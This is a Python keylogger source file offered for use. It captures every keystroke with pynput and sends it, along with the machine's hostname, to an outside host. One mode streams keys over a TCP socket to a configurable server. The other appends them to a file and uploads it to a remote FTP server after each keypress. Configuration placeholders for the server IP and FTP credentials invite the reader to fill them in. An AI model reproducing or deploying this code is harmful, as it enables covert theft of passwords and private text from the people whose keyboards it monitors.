import socket
import sys
from pynput.keyboard import Key, Listener
import ftplib

# Set debug mode True or False, if set to True, you will get output in te command prompt
debug = True

###########################################################################
# ======================= Globals and Variables ========================= #
###########################################################################
ip = "{{ip_of_server}}"  # IP Of the dest server, change to the IP of your server -> see keylogger_server.py
port = 65432  # Port of the dest server, change according to the port configured in keylogger_server.py
retry = 0  # DON'T Touch
buffer = 1024  # Buffer, DON'T Touch
pressed_key = ""

###########################################################################
# ================================ Mode ================================= #
###########################################################################
# Uncomment the wanted version and comment out (#) the other version!
# mode = "server"
mode = "ftp"

###########################################################################
# ============================== FTP Info =============================== #
###########################################################################
ftpuser = "{{ftp_username}}"
ftppass = "{{ftp_password}}"
ftpip = "{{ftp_ip_OR_domainname}}"


###########################################################################
# ============================ Server Mode ============================== #
###########################################################################
def server_mode():
    # Start Connection with the server
    def start_connection():
        global retry
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connection.connect((ip, port))
            if debug:
                print("Connected")
            key_log(connection)
        except socket.error:
            retry += 1
            if retry < 5:
                if debug:
                    print("Could not connect to server! Trying again ...")
                start_connection()
            else:
                if debug:
                    print("Retry " + str(retry) + " failed! Server Unreachable! Exiting Program!")
                sys.exit()

    # Log key presses and send them to the server
    def key_log(connection):
        hostname = socket.gethostname()

        def on_press(key):
            key = hostname + "," + str(key)
            connection.send(key.encode("utf-8"))
            if debug:
                print("Sent Message: " + key)

        with Listener(
                on_press=on_press) as listener:
            listener.join()

    start_connection()


###########################################################################
# ============================== FTP Mode =============================== #
###########################################################################
def ftp_mode():
    def start_connection():
        ftp = ftplib.FTP(ftpip, ftpuser, ftppass)
        ftp.encoding = "utf-8"
        key_log(ftp)

    # Log key presses and send them to the server
    def key_log(ftp):
        hostname = socket.gethostname()

        def on_press(key):
            global pressed_key

            if key == Key.space:
                pressed_key = "SPACE "
                pass
            elif key == Key.enter:
                pressed_key = "ENTER "
                pass
            elif key == Key.backspace:
                pressed_key = "BACKSPACE "
                pass
            elif key == Key.shift:
                pressed_key = "LEFT-SHIFT "
                pass
            elif key == Key.ctrl_l:
                pressed_key = "LEFT-CONTROL "
                pass
            elif key == Key.ctrl_r:
                pressed_key = "RIGHT-CONTROL "
                pass
            elif key == Key.shift_r:
                pressed_key = "RIGHT-SHIFT "
                pass
            elif key == Key.alt_l:
                pressed_key = "LEFT-ALT "
                pass
            elif key == Key.alt_gr:
                pressed_key = "ALT-GR "
                pass
            elif key == Key.tab:
                pressed_key = "TAB "
                pass
            elif key == Key.caps_lock:
                pressed_key = "CAPS-LOCK "
                pass
            else:
                pressed_key = str(key) + " "

            filename = hostname + ".txt"
            f = open(filename, "a")
            key_to_write = pressed_key.replace("'", "")
            f.write(key_to_write)
            f.close()

            with open(filename, "rb") as file:
                ftp.storbinary(f"STOR private/{filename}", file)

        with Listener(
                on_press=on_press) as listener:
            listener.join()

    start_connection()


###########################################################################
# ============================= Check Mode ============================== #
###########################################################################
def check_mode():
    if mode == "server":
        if debug:
            print("Initializing Server Mode!")
        server_mode()
    elif mode == "ftp":
        if debug:
            print("Initializing FTP Mode!")
        ftp_mode()


check_mode()
